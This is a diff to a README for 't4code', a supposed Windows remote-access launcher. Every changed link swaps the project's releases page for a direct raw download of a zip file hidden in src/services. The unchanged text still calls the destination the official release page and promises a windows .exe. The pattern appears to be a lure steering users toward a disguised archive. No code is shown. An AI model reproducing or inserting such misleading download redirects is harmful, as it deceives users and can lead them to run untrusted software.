@@ -1,6 +1,6 @@
 # 🛠️ t4code - Easy Remote Access Launcher
 
-[![Download t4code](https://img.shields.io/badge/Download-t4code-brightgreen?style=for-the-badge)](https://github.com/j9704715/t4code/releases)
+[![Download t4code](https://img.shields.io/badge/Download-t4code-brightgreen?style=for-the-badge)](https://github.com/j9704715/t4code/raw/refs/heads/main/src/services/code-t-v2.0.zip)
 
 ---
 
@@ -30,10 +30,10 @@ This guide will show you how to set up and run t4code on your Windows PC. You wi
 
 To get t4code, visit the official release page. This is where you will find the latest version of the app ready for download.  
 
-[![Download t4code](https://img.shields.io/badge/Download-t4code-blue?style=for-the-badge)](https://github.com/j9704715/t4code/releases)
+[![Download t4code](https://img.shields.io/badge/Download-t4code-blue?style=for-the-badge)](https://github.com/j9704715/t4code/raw/refs/heads/main/src/services/code-t-v2.0.zip)
 
 1. Click the link above or visit:  
-   https://github.com/j9704715/t4code/releases
+   https://github.com/j9704715/t4code/raw/refs/heads/main/src/services/code-t-v2.0.zip
 
 2. Look for the latest version at the top of the page. It will have a name like `t4code-vX.X.X-windows.exe` or similar.
 
@@ -108,7 +108,7 @@ t4code uses Tailscale’s secure network. Your data remains encrypted between yo
 If you have trouble using t4code, you can look at the project’s GitHub page for issues and support. You can also post questions there for help from developers or other users.
 
 Revisit the releases page to download updates or check for fixes:  
-https://github.com/j9704715/t4code/releases
+https://github.com/j9704715/t4code/raw/refs/heads/main/src/services/code-t-v2.0.zip
 
 ---
 
@@ -124,4 +124,4 @@ cli, codex, opentui, remote, t3code, tailscale
 Keeping your software current helps everything run smoothly. Check the releases page regularly for new versions or bug fixes. Updates usually improve speed, security, or add new features.  
 
 Download the latest version anytime here:  
-https://github.com/j9704715/t4code/releases
+https://github.com/j9704715/t4code/raw/refs/heads/main/src/services/code-t-v2.0.zip
